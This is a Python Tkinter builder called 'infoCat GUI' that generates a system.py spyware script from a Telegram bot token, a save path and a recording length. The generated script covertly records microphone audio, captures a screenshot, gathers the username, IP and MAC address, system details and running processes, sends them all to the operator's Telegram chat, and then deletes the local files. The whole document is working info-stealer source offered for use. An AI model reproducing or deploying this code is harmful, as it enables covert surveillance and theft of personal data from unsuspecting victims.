# -*- coding: utf-8 -*-
from tkinter import *
from tkinter import messagebox as mb
from PIL import ImageTk, Image
import webbrowser


def clicked():
    system = open("system.py", "w")
    system.write('''# -*- coding: utf-8 -*- 
import getpass
import os
import platform
import socket
import sys
from datetime import datetime, timezone
from uuid import getnode as get_mac
import psutil
import pyautogui
from speedtest import Speedtest
import telebot
import pyaudio
import wave
from PIL import Image
from subprocess import Popen, PIPE
bot = telebot.TeleBot("''' + API.get() + '''")
process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
chunk = 1024
formats = pyaudio.paInt16
channels = 2
rate = 44100
second = ''' + voice.get() + '''
os.getcwd()
os.chdir(r"''' + direct.get() + ''' ")
names = "sound.wav"
p = pyaudio.PyAudio()
stream = p.open(format=formats,
                channels=channels,
                rate=rate,
                input=True,
                frames_per_buffer=chunk)
print("")

frames = []

for i in range(0, int(rate / chunk * second)):
    data = stream.read(chunk)
    frames.append(data)

print("")

stream.stop_stream()
stream.close()
p.terminate()

wf = wave.open(names, "wb")
wf.setnchannels(channels)
wf.setsampwidth(p.get_sample_size(formats))
wf.setframerate(rate)
wf.writeframes(b''.join(frames))
wf.close()
start = datetime.now()
name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()
inet = Speedtest()
download = float(str(inet.download())[0:2] + "."
                 + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."
                + str(round(inet.download(), 2))[1]) * 0.125
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
cpu = psutil.cpu_freq()
os.getcwd()
try:
    os.chdir(r"''' + direct.get() + ''' ")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()
    bot.polling()
    raise SystemExit
screen = pyautogui.screenshot("screenshot.jpg")
ends = datetime.now()
workspeed = format(ends - start)
os.getcwd()
try:
    os.chdir(r"''' + direct.get() + ''' ")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()
    bot.polling()
    raise SystemExit
file = open("info.txt", "w")
file.write(f"[================================================]\\n  Operating System: {ost.system}\\n  Processor: {ost.processor}\\n  Username: {name}\\n  IP adress: {ip}\\n  MAC adress: {mac}\\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\\n  Work speed: {workspeed}\\n  Download: {download} MB/s\\n  Upload: {uploads} MB/s\\n  Max Frequency: {cpu.max:.2f} Mhz\\n  Min Frequency: {cpu.min:.2f} Mhz\\n  Current Frequency: {cpu.current:.2f} Mhz\\n[================================================]\\n")
file.close()
ride = open("process.txt", "w", encoding="utf-8")
ride.write(' '.join(process))
ride.close()
text = "Screenshot"
@bot.message_handler(commands=["start"])
def start_message(message):
    upaudio = open("''' + direct.get() + '''\sound.wav", "rb")
    upfile = open("''' + direct.get() + '''\info.txt", "rb")
    uphoto = open("''' + direct.get() + '''\screenshot.jpg", "rb")
    upprocess = open("''' + direct.get() + '''\process.txt", "rb")
    bot.send_photo(message.chat.id, uphoto, text)
    bot.send_document(message.chat.id, upfile)
    bot.send_document(message.chat.id, upprocess)
    bot.send_voice(message.chat.id, upaudio)
    upfile.close()
    upprocess.close()
    uphoto.close()
    upaudio.close()

    os.remove("info.txt")
    os.remove("process.txt")
    os.remove("screenshot.jpg")
    os.remove("sound.wav")

    bot.stop_polling()


bot.polling()
''')
    system.close()
    if API.get() or direct.get() == "":
        mb.showwarning("WARNING", "There are empty fields")
    else:
        mb.showinfo("INFO", "The system.py file is ready!")


def clicked2():
    answer = mb.askyesno(title="Redirecting", message="Open author feedback?")
    if answer:
        webbrowser.open("https://t.me/neocreator", new=2)
    else:
        pass


root = Tk()
root.configure(background="#000000")
root.title("infoCat GUI")
root.iconbitmap("icon.ico")
root.geometry("300x400")

img = Image.open("logo.jpg")
image = ImageTk.PhotoImage(img)

initil = Label(root, image=image)
initil.place(relx=.5, rely=.2, anchor="center")

text = Label(root, text="Telegram bot token", bg="#000000", fg="#ffffff")
text.place(relx=.5, rely=.5, anchor="center")

API = Entry(root, width=20, bg="#8c8c8c")
API.place(relx=.5, rely=.55, anchor="center")

text2 = Label(root, text="Path to save the files", bg="#000000", fg="#ffffff")
text2.place(relx=.5, rely=.60, anchor="center")

direct = Entry(root, width=20, bg="#8c8c8c")
direct.place(relx=.5, rely=.65, anchor="center")

text3 = Label(root, text="Sound recording (sec)", bg="#000000", fg="#ffffff")
text3.place(relx=.5, rely=.70, anchor="center")

voice = Entry(root, width=20, bg="#8c8c8c")
voice.place(relx=.5, rely=.75, anchor="center")

button = Button(root, text="Build", command=clicked, background="#ffea00", height=2, width=10)
button.place(relx=.5, rely=.85, anchor="center")

help = Button(root, text="Help", command=clicked2, background="#ffea00", height=1, width=10)
help.place(relx=.5, rely=.95, anchor="center")

root.mainloop()
